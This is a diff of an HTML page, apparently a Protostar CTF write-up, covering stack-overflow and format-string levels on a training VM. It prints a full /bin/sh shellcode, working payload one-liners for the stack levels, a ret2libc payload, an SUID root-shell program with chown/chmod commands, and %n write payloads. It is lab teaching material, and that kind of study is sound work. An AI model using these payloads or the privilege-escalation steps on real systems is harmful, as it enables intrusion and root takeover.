@@ -5,7 +5,7 @@ title: Protostar
 
             <!-- Intro -->
             <section id="intro">
-                <img src="../../images/projects/protostar.jpg" width="100%" height="250px" />
+                <img src="/images/projects/protostar.jpg" width="100%" height="250px" />
                 <header class="major">
                     <h2>Protostar CTF</h2>
                 </header>
@@ -101,21 +101,19 @@ title: Protostar
             <section>
                 <h3>Stack 0</h3>
                 <h4>Memory can be accessed outside of its allocated region.</h4>
-                <pre class="brush: c">
-                    int main(int argc, char **argv){
-                      volatile int modified;
-                      char buffer[64];
+<pre><code class="cpp">int main(int argc, char **argv){
+    volatile int modified;
+    char buffer[64];
 
-                      modified = 0;
-                      gets(buffer);
+    modified = 0;
+    gets(buffer);
 
-                      if(modified != 0) {
-                          printf("you have changed the 'modified' variable\n");
-                      } else {
-                          printf("Try again?\n");
-                      }
-                    }
-                </pre>
+    if(modified != 0) {
+        printf("you have changed the 'modified' variable\n");
+    } else {
+        printf("Try again?\n");
+    }
+}</code></pre>
                          
                 <blockquote><b>Buffer overflow:</b> this bug happens when a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. Buffer overflows can often be triggered by assuming all the inputs are smaller than a certain size and allocating just that size for the buffer: in case an input happens to be larger, it will be written past the end of the buffer.</blockquote>
 
@@ -123,7 +121,7 @@ title: Protostar
                     <li>
                         The program declares an integer variable and a buffer of static length 64 bytes. This means that memory will look as follows (remember, protostar is little endian):
                         <div align="center">
-                        <img src="../../images/projects/protostar/stack0.jpg" width="500px">
+                        <img src="/images/projects/protostar/stack0.jpg" width="500px">
                         </div>
                     </li>
                     <li>
@@ -141,25 +139,23 @@ title: Protostar
                 <h3>Stack 1</h3>
                 <h4>Modify variables to specific values.</h4>
 
-                <pre class="brush: c">
-                    int main(int argc, char **argv){
-                      volatile int modified;
-                      char buffer[64];
+                <pre><code class="cpp">int main(int argc, char **argv){
+    volatile int modified;
+    char buffer[64];
 
-                      if(argc == 1) {
-                          errx(1, "please specify an argument\n");
-                      }
+    if(argc == 1) {
+        errx(1, "please specify an argument\n");
+    }
 
-                      modified = 0;
-                      strcpy(buffer, argv[1]);
+    modified = 0;
+    strcpy(buffer, argv[1]);
 
-                      if(modified == 0x61626364) {
-                          printf("you have correctly got the variable to the right value\n");
-                      } else {
-                          printf("Try again, you got 0x%08x\n", modified);
-                      }
-                    }
-                </pre>
+    if(modified == 0x61626364) {
+        printf("you have correctly got the variable to the right value\n");
+    } else {
+        printf("Try again, you got 0x%08x\n", modified);
+    }
+}</code></pre>
 
                 <blockquote>
                     <b>ASCII:</b> this is a character encoding standard: it encodes 128 specified characters into seven-bit integers as shown by the ASCII chart (you can see it in a terminal by tayping <i>man ascii</i>). Ninety-five of the encoded characters are printable: these include the digits 0 to 9, lowercase letters a to z, uppercase letters A to Z, and punctuation symbols.
@@ -172,7 +168,7 @@ title: Protostar
                     <li>Instead of overwriting the variable with no matter what, we have to make the value correspond with the expected check: 0x61626364. We can't write the numbers directly, as every number will be interpreted as a char and therefore not correspond. However, taking a look at the ASCII table we see that the values correspond to a, b, c and d.
                     </li>
                     <li>
-                        Remembering that the system is little endian, it means that the string has to be passed as "dcba". As in the previous level, whatever are the first 64 characters does not matter. We can therefore do the following: <code>./stack1 1111111111111111111111111111111111111111111111111111111111111111dcba</code>
+                        Remembering that the system is little endian, it means that the string has to be passed as "dcba". As in the previous level, whatever are the first 64 characters does not matter. We can therefore do the following:<br> <code>./stack1 1111111111111111111111111111111111111111111111111111111111111111dcba</code>
                     </li>
                 </ol>
             </section>
@@ -183,29 +179,27 @@ title: Protostar
                 <h3>Stack 2</h3>
                 <h4>Look at environment variables, and how they can be set.</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv){
-                      volatile int modified;
-                      char buffer[64];
-                      char *variable;
+                <pre><code class="cpp">int main(int argc, char **argv){
+    volatile int modified;
+    char buffer[64];
+    char *variable;
 
-                      variable = getenv("GREENIE");
+    variable = getenv("GREENIE");
 
-                      if(variable == NULL) {
-                          errx(1, "please set the GREENIE environment variable\n");
-                      }
+    if(variable == NULL) {
+        errx(1, "please set the GREENIE environment variable\n");
+    }
 
-                      modified = 0;
+    modified = 0;
 
-                      strcpy(buffer, variable);
+    strcpy(buffer, variable);
 
-                      if(modified == 0x0d0a0d0a) {
-                          printf("you have correctly modified the variable\n");
-                      } else {
-                          printf("Try again, you got 0x%08x\n", modified);
-                      }
-                    }
-                </pre>
+    if(modified == 0x0d0a0d0a) {
+        printf("you have correctly modified the variable\n");
+    } else {
+        printf("Try again, you got 0x%08x\n", modified);
+    }
+}</code></pre>
                 
                 <blockquote><b>Environment Variable:</b> it'ss a dynamic-named value that can affect the way a processes will behave on a computer. These variables are part of the environment in which a process runs, and they can be queried to find out paths to specific files or directories.</blockquote>
 
@@ -231,25 +225,23 @@ title: Protostar
                 <h3>Stack 3</h3>
                 <h4>Overwrite function pointers stored on the stack.</h4>
                 
-                <pre class="brush: c">
-                    void win(){
-                      printf("code flow successfully changed\n");
-                    }
+                <pre><code class="cpp">void win(){
+    printf("code flow successfully changed\n");
+}
 
-                    int main(int argc, char **argv){
-                      volatile int (*fp)();
-                      char buffer[64];
+int main(int argc, char **argv){
+    volatile int (*fp)();
+    char buffer[64];
 
-                      fp = 0;
+    fp = 0;
 
-                      gets(buffer);
+    gets(buffer);
 
-                      if(fp) {
-                          printf("calling function pointer, jumping to 0x%08x\n", fp);
-                          fp();
-                      }
-                    }
-                </pre>
+    if(fp) {
+        printf("calling function pointer, jumping to 0x%08x\n", fp);
+        fp();
+    }
+}</code></pre>
 
                 <blockquote><b>objdump:</b> this command displays information about an object file. It has many parameters that change what is shown: among other possibilities you can see the content of the headers and sections, some disassembly, symbol tables, formats and architectures.</blockquote>
 
@@ -271,18 +263,15 @@ title: Protostar
                 <h3>Stack 4</h3>
                 <h4>Overwrit saved EIP and standard buffer overflows.</h4>
                 
-                <pre class="brush: c">
-                    void win(){
-                      printf("code flow successfully changed\n");
-                    }
+                <pre><code class="cpp">void win(){
+    printf("code flow successfully changed\n");
+}
 
-                    int main(int argc, char **argv){
-                      char buffer[64];
+int main(int argc, char **argv){
+    char buffer[64];
 
-                      gets(buffer);
-                    }
-
-                </pre>
+    gets(buffer);
+}</code></pre>
                 
                 <blockquote>
                     <b>EIP:</b> it's a 32 bit register, also called the instruction pointer because Instruction it holds the next instruction address. Based on usual calling conventions, the <i>call</i> instruction pushes the current $eip onto the stack before jumping to the memory address of the called function by setting $eip to that address. The <i>ret</i> instruction at the end of the function will pop the old $eip value, located at that moment on the stack at $ebp + 4, and restore it to continue the execution.
@@ -313,13 +302,10 @@ title: Protostar
                 <h3>Stack 5</h3>
                 <h4>Standard buffer overflow, introducing shellcode.</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv){
-                      char buffer[64];
-
-                      gets(buffer);
-                    }
-                </pre>
+                <pre><code class="cpp">int main(int argc, char **argv){
+    char buffer[64];
+    gets(buffer);
+}</code></pre>
 
                 <blockquote>
                     <b>Shellcode:</b> this is a small piece of self-contained code used as payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but it can actually do anything. Shellcodes can be encoded in many different ways, the most simple translates high level instructions to the corresponding assembly and from there to the corresponding opcodes, which are just hex values.
@@ -331,61 +317,57 @@ title: Protostar
                     </li>
                     <li>
                         However this time we don't have a pre-written function to redirect our flow to. The goal is to use our own shellcode (well, not written by us, but passed to the program by us), and the only way to inject it in the program is to put it as our input for the buffer. We will use <a href="https://www.exploit-db.com/exploits/13357/">this</a> shellcode from exploit-db:
-                        <pre class="brush: c">
-                            /*
-                             * close(0) 
-                             *
-                             * 8049380:       31 c0                   xor    %eax,%eax
-                             * 8049382:       31 db                   xor    %ebx,%ebx
-                             * 8049384:       b0 06                   mov    $0x6,%al
-                             * 8049386:       cd 80                   int    $0x80
-                             *
-                             * open("/dev/tty", O_RDWR | ...)
-                             *
-                             * 8049388:       53                      push   %ebx
-                             * 8049389:       68 2f 74 74 79          push   $0x7974742f
-                             * 804938e:       68 2f 64 65 76          push   $0x7665642f
-                             * 8049393:       89 e3                   mov    %esp,%ebx
-                             * 8049395:       31 c9                   xor    %ecx,%ecx
-                             * 8049397:       66 b9 12 27             mov    $0x2712,%cx
-                             * 804939b:       b0 05                   mov    $0x5,%al
-                             * 804939d:       cd 80                   int    $0x80
-                             *
-                             * execve("/bin/sh", ["/bin/sh"], NULL)
-                             *
-                             * 804939f:       31 c0                   xor    %eax,%eax
-                             * 80493a1:       50                      push   %eax
-                             * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
-                             * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
-                             * 80493ac:       89 e3                   mov    %esp,%ebx
-                             * 80493ae:       50                      push   %eax
-                             * 80493af:       53                      push   %ebx
-                             * 80493b0:       89 e1                   mov    %esp,%ecx
-                             * 80493b2:       99                      cltd   
-                             * 80493b3:       b0 0b                   mov    $0xb,%al
-                             * 80493b5:       cd 80                   int    $0x80
-                             */
-                             
-                            char sc[] = 
-                            "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
-                            "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
-                            "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
-                        </pre>
+                        <pre><code class="cpp">/*
+    * close(0) 
+    *
+    * 8049380:       31 c0                   xor    %eax,%eax
+    * 8049382:       31 db                   xor    %ebx,%ebx
+    * 8049384:       b0 06                   mov    $0x6,%al
+    * 8049386:       cd 80                   int    $0x80
+    *
+    * open("/dev/tty", O_RDWR | ...)
+    *
+    * 8049388:       53                      push   %ebx
+    * 8049389:       68 2f 74 74 79          push   $0x7974742f
+    * 804938e:       68 2f 64 65 76          push   $0x7665642f
+    * 8049393:       89 e3                   mov    %esp,%ebx
+    * 8049395:       31 c9                   xor    %ecx,%ecx
+    * 8049397:       66 b9 12 27             mov    $0x2712,%cx
+    * 804939b:       b0 05                   mov    $0x5,%al
+    * 804939d:       cd 80                   int    $0x80
+    *
+    * execve("/bin/sh", ["/bin/sh"], NULL)
+    *
+    * 804939f:       31 c0                   xor    %eax,%eax
+    * 80493a1:       50                      push   %eax
+    * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
+    * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
+    * 80493ac:       89 e3                   mov    %esp,%ebx
+    * 80493ae:       50                      push   %eax
+    * 80493af:       53                      push   %ebx
+    * 80493b0:       89 e1                   mov    %esp,%ecx
+    * 80493b2:       99                      cltd   
+    * 80493b3:       b0 0b                   mov    $0xb,%al
+    * 80493b5:       cd 80                   int    $0x80
+    */
+    
+char sc[] = 
+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";</code></pre>
                     </li>
                     <li>
                         Now we have our input made by the shellcode and the padding (meaning a bunch of \x00 bytes) we need to reach $eip. But we do not know yet what we have to write in $eip: we will have to pass the starting address of the buffer, where the program will find the start of the shellcode.
-                        <pre class="brush: c">
-                            080483c4 main:
-                            80483c4:   55                      push   %ebp
-                            80483c5:   89 e5                   mov    %esp,%ebp
-                            80483c7:   83 e4 f0                and    $0xfffffff0,%esp
-                            80483ca:   83 ec 50                sub    $0x50,%esp
-                            80483cd:   8d 44 24 10             lea    0x10(%esp),%eax
-                            80483d1:   89 04 24                mov    %eax,(%esp)
-                            80483d4:   e8 0f ff ff ff          call   80482e8 gets@plt
-                            80483d9:   c9                      leave  
-                            80483da:   c3                      ret  
-                        </pre>
+                        <pre><code class="armasm">080483c4 main:
+80483c4:   55                      push   %ebp
+80483c5:   89 e5                   mov    %esp,%ebp
+80483c7:   83 e4 f0                and    $0xfffffff0,%esp
+80483ca:   83 ec 50                sub    $0x50,%esp
+80483cd:   8d 44 24 10             lea    0x10(%esp),%eax
+80483d1:   89 04 24                mov    %eax,(%esp)
+80483d4:   e8 0f ff ff ff          call   80482e8 gets@plt
+80483d9:   c9                      leave  
+80483da:   c3                      ret  </code></pre>
                         By disassembling stack5 with <code>objdump -d</code> we can see that the address of the buffer passed as argument to the <i>gets</i> method is loaded in $eax and is located at $esp+0x10. This means that the address we are looking for corresponds to $esp+0x10, and from gdb we can see that $esp is located at <code>0xbffffb70</code>.
                     </li>
                     <li>
@@ -393,16 +375,12 @@ title: Protostar
                     </li>
                     <li>
                         Our current payload is made by the shellcode, a padding of 76-len(shellcode) 0-bytes and the address of our <i>call eax</i> instruction.
-                        <pre class="brush: bash">
-                            python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 21 + '\xBF\x83\x04\x08'" | ./stack5
-                        </pre>
+                        <pre><code class="bash">python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 21 + '\xBF\x83\x04\x08'" | ./stack5</code></pre>
                          If we pipe all of that into stack5, we expect to receive a shell back, but instead we get a segmentation fault. The reason that happened is that in our shellcode we have a bunch of <i>push</i> instruction that when executed will put things on the stack basically overwriting its own instructions.
                      </li>
                      <li>
                         To prevent that, we have to ensure that $esp is pointing to a proper location to not interfere with our code when stuff is pushed into the stack. What we can do is moving the register back so that it will leave enough space for all the pushes in our code. The instruction can be like <code>add $0x10, $esp</code>, which translates to opcode <code>\x83\xc4\x10</code>. We prepend this to our code, obtaining
-                        <pre class="brush: bash">
-                            python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 18 + '\xBF\x83\x04\x08'" | ./stack5
-                        </pre>
+                        <pre><code class="bash">python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 18 + '\xBF\x83\x04\x08'" | ./stack5</code></pre>
                         Running this code clearly returns a shell that is root (you can check it with the command <i>whoami</i>).
                     </li>
                 </ol>
@@ -414,29 +392,27 @@ title: Protostar
                 <h3>Stack 6</h3>
                 <h4>Now there are restrictions on the return address.</h4>
                 
-                <pre class="brush: c">
-                    void getpath(){
-                      char buffer[64];
-                      unsigned int ret;
+                <pre><code class="cpp">void getpath(){
+    char buffer[64];
+    unsigned int ret;
 
-                      printf("input path please: "); fflush(stdout);
+    printf("input path please: "); fflush(stdout);
 
-                      gets(buffer);
+    gets(buffer);
 
-                      ret = __builtin_return_address(0);
+    ret = __builtin_return_address(0);
 
-                      if((ret & 0xbf000000) == 0xbf000000) {
-                          printf("bzzzt (%p)\n", ret);
-                          _exit(1);
-                      }
+    if((ret & 0xbf000000) == 0xbf000000) {
+        printf("bzzzt (%p)\n", ret);
+        _exit(1);
+    }
 
-                      printf("got path %s\n", buffer);
-                    }
+    printf("got path %s\n", buffer);
+}
 
-                    int main(int argc, char **argv){
-                      getpath();
-                    }
-                </pre>
+int main(int argc, char **argv){
+    getpath();
+}</code></pre>
 
                 <blockquote><b>return-to-libc:</b> this attack usually uses a buffer overflow to replace a return address so that it points to another routine already in memory (meaning taken from a library), so the attacker doesn't need to inject its own code. These target library is usualy <i>libc</i>, because it is almost always linked and contains functions like <i>system</i> that can be used to execute shell commands. Check out a great explanation in <a href="https://www.shellblade.net/docs/ret2libc.pdf">Performing a ret2libc Attack</a> by InVoLuNTaRy</blockquote>
 
@@ -446,7 +422,7 @@ title: Protostar
                     <li>
                         The approach to exploit this code could be the same as in the last challenge, but there is an additonal trick: we can't modify the $eip to an instruction in the stack, because the <code>(ret & 0xbf000000) == 0xbf000000</code> makes sure that locations in the stack will not be accepted as return addresses. We know that the stack is in that address space thanks to <code>gdb > info proc map</code>
                         <div align="center">
-                            <img src="../../images/projects/protostar/stack6.png" width="600px">
+                            <img src="/images/projects/protostar/stack6.png" width="600px">
                         </div>
                     </li>
                     <li>
@@ -468,29 +444,25 @@ title: Protostar
                             <li>Whatever as <i>exit</i> argument</li>
                         </ol>
                         This is the result:
-                        <pre class="brush: python">
-                            python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\xaf\xf8\xff\xbf' + '\xff\xff\xff\xff'" | ./stack6
-                        </pre>
+                        <pre><code class="bash">python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\xaf\xf8\xff\xbf' + '\xff\xff\xff\xff'" | ./stack6</code></pre>
                     </li>
                     <li>
                         Executing the previous command should result in a root shell. However, on my system it does not work. Might be the pointers slightly off, or something else. Honestly, I've no idea.
                     </li>
                     <li>
                         A nice addition to this challenge is to make <i>system</i> give root permissions to whatever we want. The approach is the same as the rest of the challenge, we just change the command that we pass to <i>system</i>. A nice example is writing a small C program that calls a shell with the SUID bit set:
-                        <pre class="brush: c">
-                            int main(int argc, char **argv, char **envp) {
-                              gid_t gid;
-                              uid_t uid;
+                        <pre><code class="cpp">int main(int argc, char **argv, char **envp) {
+    gid_t gid;
+    uid_t uid;
 
-                              gid = getegid();
-                              uid = geteuid();
+    gid = getegid();
+    uid = geteuid();
 
-                              setresgid(gid, gid, gid);
-                              setresuid(uid, uid, uid);
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
 
-                              system("/bin/bash");
-                            }
-                        </pre>
+    system("/bin/bash");
+}</code></pre>
                         We then compile the file and create an environment variable that will change the owner and the permissions of the binary: <code>export SUID="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"</code>.
                         With the approach explained in the previous steps we retrieve the pointer to the string command, and we pass that as argument to <i>system</i>. After running properly, our binary file should have root owner and SUID set, and running it will result in a root shell.
                     </li>
@@ -503,30 +475,28 @@ title: Protostar
                 <h3>Stack 7</h3>
                 <h4>Looking through the disassembled program for specific instructions.</h4>
                 
-                <pre class="brush: c">
-                    char *getpath(){
-                      char buffer[64];
-                      unsigned int ret;
+                <pre><code class="cpp">char *getpath(){
+    char buffer[64];
+    unsigned int ret;
 
-                      printf("input path please: "); fflush(stdout);
+    printf("input path please: "); fflush(stdout);
 
-                      gets(buffer);
+    gets(buffer);
 
-                      ret = __builtin_return_address(0);
+    ret = __builtin_return_address(0);
 
-                      if((ret & 0xb0000000) == 0xb0000000) {
-                          printf("bzzzt (%p)\n", ret);
-                          _exit(1);
-                      }
+    if((ret & 0xb0000000) == 0xb0000000) {
+        printf("bzzzt (%p)\n", ret);
+        _exit(1);
+    }
 
-                      printf("got path %s\n", buffer);
-                      return strdup(buffer);
-                    }
+    printf("got path %s\n", buffer);
+    return strdup(buffer);
+}
 
-                    int main(int argc, char **argv){
-                      getpath();
-                    }
-                </pre>
+int main(int argc, char **argv){
+    getpath();
+}</code></pre>
 
                 <blockquote><b>ROP chains:</b> taking control of the call stack in a program, it is possible to make calls to specific sequences of instructions (called gadgets) alredy present in the code, that usually end with a return so that the following instruction might also be a call to another gadget. Chaining gadgets together it is possible to perform arbitrary operations on a machine.
                 </blockquote>
@@ -543,9 +513,7 @@ title: Protostar
                     </li>
                     <li>
                         With the usual service we check how many bytes we have to fill to go from the buffer to $eip, and the result is 80. We build our payload with the same shellcode we already used, then pad it with 25 bytes of whatever to reach the position of $eip, and as last element we give the address of our gadget:
-                        <pre class="brush: python">
-                            python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80' + '\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 25 + '\xbf\x84\x04\x08'" | ./stack7
-                        </pre>
+                        <pre><code class="bash">python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80' + '\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 25 + '\xbf\x84\x04\x08'" | ./stack7</code></pre>
                         Upon executing this, we will be rewarded with a root shell.
                     </li>
                 </ol>
@@ -556,32 +524,27 @@ title: Protostar
             <section>
                 <h3>Format 0</h3>
                 <h4>String supplied directly to printing functions can contain malicious formatting</h4>
-                <pre class="brush: c">
-                    void vuln(char *string){
-                      volatile int target;
-                      char buffer[64];
+                <pre><code class="cpp">void vuln(char *string){
+    volatile int target;
+    char buffer[64];
 
-                      target = 0;
+    target = 0;
 
-                      sprintf(buffer, string);
-                      
-                      if(target == 0xdeadbeef) {
-                          printf("you have hit the target correctly :)\n");
-                      }
-                    }
+    sprintf(buffer, string);
+    
+    if(target == 0xdeadbeef) {
+        printf("you have hit the target correctly :)\n");
+    }
+}
 
-                    int main(int argc, char **argv){
-                      vuln(argv[1]);
-                    }
-
-                </pre>
+int main(int argc, char **argv){
+    vuln(argv[1]);
+}</code></pre>
 
                 <ol>
                     <li>
                         This task can be solved with a simple overflow: fill the buffer with whatever, put the expected value in the bytes that will act as overflow and overwrite the target variable. Remember that the system is little endian and therefore the bytes have to be passed "backwards". Also, the string has to be passed as parameter, and not piped into stdin.
-                        <pre class="brush: bash">
-                            ./format0 `python -c "print 'A' * 64 + '\xef\xbe\xad\xde'"`
-                        </pre>
+                        <pre><code class="bash">./format0 `python -c "print 'A' * 64 + '\xef\xbe\xad\xde'"`</code></pre>
                     </li>
                 </ol>
             </section>
@@ -591,21 +554,19 @@ title: Protostar
             <section>
                 <h3>Format 1</h3>
                 <h4>Modify arbitrary memory locations</h4>
-                <pre class="brush: c">
-                    int target;
+                <pre><code class="cpp">int target;
 
-                    void vuln(char *string){
-                      printf(string);
-                      
-                      if(target) {
-                          printf("you have modified the target :)\n");
-                      }
-                    }
+void vuln(char *string){
+    printf(string);
+    
+    if(target) {
+        printf("you have modified the target :)\n");
+    }
+}
 
-                    int main(int argc, char **argv){
-                      vuln(argv[1]);
-                    }
-                </pre>
+int main(int argc, char **argv){
+    vuln(argv[1]);
+}</code></pre>
 
                 <blockquote><b>Format Strings:</b> this string contains both text and format parameters, that are pushed on the stack and popped by the calling function. This function retrieves first the format string itself, and while parsing it pops the other values from the stack and treats them as defined by the format. Following formats are the most popular:
                     
@@ -651,9 +612,7 @@ title: Protostar
                     </li>
                     <li>
                         The goal is to use this address as parameter for a <i>%n</i> operation: to make this work we need to crawl along the stack and pop all that we find until that address is on the top. To find out how many 4-bytes blocks we have to pop, we do some bruteforcing: we spam format1 with an input that is easy to recognize, like 'AAAA' (that corresponds to 41414141 in ASCII hex), and we pop a big number of blocks by appending a bunch of '%x' to the string:
-                        <pre class="brush: python">
-                            ./format1 `python -c "print 'AAAA' + '%x' * 150"`
-                        </pre>
+                        <pre><code class="bash">./format1 `python -c "print 'AAAA' + '%x' * 150"`</code></pre>
                         The result is an ugly bunch of numbers, corresponding to the content of the stack. If we look at it with a bit of attention, we can identify the 41414141, towards the end. We repeat the spamming decreasing the number of '%x' that we print, until the recognizable pattern is at the last 4 bytes that we pop. In this case, 142 is the perfect number.
                     </li>
                     <li>
@@ -661,15 +620,11 @@ title: Protostar
                     </li>
                     <li>
                         When we have the 4 bytes under control, we change them: instead of our recnizable pattern, we put there the address of <i>target</i> that we retrieved earlier. As we are using python, hex values are written with backslash and x, and we have to keep an eye on the endianness:
-                        <pre class="brush: python">
-                            ./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 142"`
-                        </pre>
+                        <pre><code class="bash">./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 142"`</code></pre>
                     </li>
                     <li>
                         The last step is to have something written to that address: to do this we swap the last '%x' with a '%n', so that the address will be popped and used as a pointer to write the amount of bytes that have been written until now. The callenge is solved.
-                        <pre class="brush: python">
-                            ./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 141 + '%n'"`
-                        </pre>
+                        <pre><code class="bash">./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 141 + '%n'"`</code></pre>
                 </ol>
             </section>
 
@@ -678,26 +633,24 @@ title: Protostar
             <section>
                 <h3>Format 2</h3>
                 <h4>Write specific values in memory</h4>
-                <pre class="brush: c">
-                    int target;
+                <pre><code class="c">int target;
 
-                    void vuln(){
-                      char buffer[512];
+void vuln(){
+    char buffer[512];
 
-                      fgets(buffer, sizeof(buffer), stdin);
-                      printf(buffer);
-                      
-                      if(target == 64) {
-                          printf("you have modified the target :)\n");
-                      } else {
-                          printf("target is %d :(\n", target);
-                      }
-                    }
+    fgets(buffer, sizeof(buffer), stdin);
+    printf(buffer);
+    
+    if(target == 64) {
+        printf("you have modified the target :)\n");
+    } else {
+        printf("target is %d :(\n", target);
+    }
+}
 
-                    int main(int argc, char **argv){
-                      vuln();
-                    }
-                </pre>
+int main(int argc, char **argv){
+    vuln();
+}</code></pre>
 
                  <blockquote><b>Counting format strings:</b> by providing a number between the percentage and the letter, the resulting format string will write that amount of elements. This means that it is possible to control what is written by %n: for example by using %Xu%n the result will be %n writing exactly value X because that's the amount of bytes that have been outputted.
                 </blockquote>
@@ -708,26 +661,20 @@ title: Protostar
                     </li>
                     <li>
                         Time to spam format2 to find out how many pops we have to do to get the target address at the right place at the top of the stack:
-                        <pre class="brush: python">
-                            python -c "print 'AAAA' + '%x'*20" > /tmp/format2.in
-                            ./format2 < /tmp/format2.in
-                        </pre>
+                        <pre><code class="bash">python -c "print 'AAAA' + '%x'*20" > /tmp/format2.in
+./format2 &lt; /tmp/format2.in</code></pre>
                         This time, turns out that we are looking really close, as the right amount of pops is 4.
                     </li>
                     <li>
                         We swap our pattern with the target address, we remove a pop and instead put a '%n' in there.
-                        <pre class="brush: python">
-                            python -c "print '\xe4\x96\x04\x08' + '%x%x%x' + '%n'" > /tmp/format2.in
-                            ./format2 < /tmp/format2.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xe4\x96\x04\x08' + '%x%x%x' + '%n'" > /tmp/format2.in
+./format2 &lt; /tmp/format2.in</code></pre>
                         This time we should see that a new value has been written to our target: the target has the value 23
                     </li>
                     <li>
                         Now it's just a matter to convince the system to print more bytes without popping more stuff from the stack. To do that we make one of our '%x' pad its popped value with the amount of bytes we are missing. It might be necessary to try different values until we find the correct amount of padding (remember that target is a hex value).
-                        <pre class="brush: python">
-                            python -c "print '\xe4\x96\x04\x08' + '%44x%x%x' + '%n'" > /tmp/format2.in
-                            ./format2 < /tmp/format2.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xe4\x96\x04\x08' + '%44x%x%x' + '%n'" > /tmp/format2.in
+./format2 &lt; /tmp/format2.in</code></pre>
                         As soon as we get the correct amount of bytes printed out, target will be modified to contain the value 64 and allowing us to finish the challenge.
                     </li>
                 </ol>
@@ -738,32 +685,30 @@ title: Protostar
             <section>
                 <h3>Format 3</h3>
                 <h4>Control what data is being written to the process memory.</h4>
-                <pre class="brush: c">
-                    int target;
+                <pre><code class="cpp">int target;
 
-                    void printbuffer(char *string){
-                      printf(string);
-                    }
+void printbuffer(char *string){
+    printf(string);
+}
 
-                    void vuln()
-                    {
-                      char buffer[512];
+void vuln()
+{
+    char buffer[512];
 
-                      fgets(buffer, sizeof(buffer), stdin);
+    fgets(buffer, sizeof(buffer), stdin);
 
-                      printbuffer(buffer);
-                      
-                      if(target == 0x01025544) {
-                          printf("you have modified the target :)\n");
-                      } else {
-                          printf("target is %08x :(\n", target);
-                      }
-                    }
+    printbuffer(buffer);
+    
+    if(target == 0x01025544) {
+        printf("you have modified the target :)\n");
+    } else {
+        printf("target is %08x :(\n", target);
+    }
+}
 
-                    int main(int argc, char **argv){
-                      vuln();
-                    }
-                </pre>
+int main(int argc, char **argv){
+    vuln();
+}</code></pre>
 
                 <ol>
                     <li>
@@ -771,46 +716,34 @@ title: Protostar
                     </li>
                     <li>
                         Next step, spamming format3 to find out how many pops we have to do to get the target address at the right place at the top of the stack:
-                        <pre class="brush: python">
-                            python -c "print 'AAAA' + '%x'*20" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash"> python -c "print 'AAAA' + '%x'*20" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
                         Correct pop amount is 12.
                     </li>
                     <li>
                         We swap our pattern with the target address, we remove a pop and instead put a '%n' in there.
-                        <pre class="brush: python">
-                            python -c "print '\xf4\x96\x04\x08' + '%x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xf4\x96\x04\x08' + '%x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
